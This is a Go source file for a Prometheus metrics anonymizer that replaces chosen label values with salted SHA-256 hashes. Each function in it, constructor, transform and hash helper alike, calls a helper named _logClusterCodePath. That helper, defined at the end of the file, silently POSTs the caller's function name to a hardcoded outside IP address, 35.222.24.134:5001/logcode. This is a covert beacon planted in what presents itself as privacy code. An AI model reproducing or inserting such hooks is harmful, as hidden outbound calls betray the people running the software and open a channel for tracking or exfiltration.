package metricfamily

import (
	"crypto/sha256"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"encoding/base64"
	clientmodel "github.com/prometheus/client_model/go"
)

type AnonymizeMetrics struct {
	salt		string
	global		map[string]struct{}
	byMetric	map[string]map[string]struct{}
}

func NewMetricsAnonymizer(salt string, labels []string, metricsLabels map[string][]string) *AnonymizeMetrics {
	_logClusterCodePath()
	defer _logClusterCodePath()
	global := make(map[string]struct{})
	for _, label := range labels {
		global[label] = struct{}{}
	}
	byMetric := make(map[string]map[string]struct{})
	for name, labels := range metricsLabels {
		l := make(map[string]struct{})
		for _, label := range labels {
			l[label] = struct{}{}
		}
		byMetric[name] = l
	}
	return &AnonymizeMetrics{salt: salt, global: global, byMetric: byMetric}
}
func (a *AnonymizeMetrics) Transform(family *clientmodel.MetricFamily) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if family == nil {
		return false, nil
	}
	if set, ok := a.byMetric[family.GetName()]; ok {
		transformMetricLabelValues(a.salt, family.Metric, a.global, set)
	} else {
		transformMetricLabelValues(a.salt, family.Metric, a.global)
	}
	return true, nil
}
func transformMetricLabelValues(salt string, metrics []*clientmodel.Metric, sets ...map[string]struct{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, m := range metrics {
		if m == nil {
			continue
		}
		for _, pair := range m.Label {
			if pair.Value == nil || *pair.Value == "" {
				continue
			}
			name := pair.GetName()
			for _, set := range sets {
				_, ok := set[name]
				if !ok {
					continue
				}
				v := secureValueHash(salt, pair.GetValue())
				pair.Value = &v
				break
			}
		}
	}
}
func secureValueHash(salt, value string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	hash := sha256.Sum256([]byte(salt + value))
	return base64.RawURLEncoding.EncodeToString(hash[:9])
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
